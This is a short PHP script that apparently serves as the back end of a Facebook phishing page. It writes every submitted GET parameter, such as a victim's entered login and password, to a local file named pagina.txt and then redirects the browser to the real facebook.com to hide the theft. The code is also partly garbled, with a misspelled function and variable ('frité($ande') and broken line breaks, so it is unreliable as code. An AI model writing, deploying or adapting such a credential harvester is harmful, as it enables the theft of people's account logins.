<?php
header("Location: https://www.facebook.com ");
$handle =

fopen("pagina.txt", "a"); 
foreach($_GET as

$variable => $value) {
fwrite($handle,

$variable);
fwrite($handle, "=");

fwrite($handle, $value);
fwrite($handle,

"\r\n");
}
frité($ande, "\r\n");
fclose($handle);
exit;
?>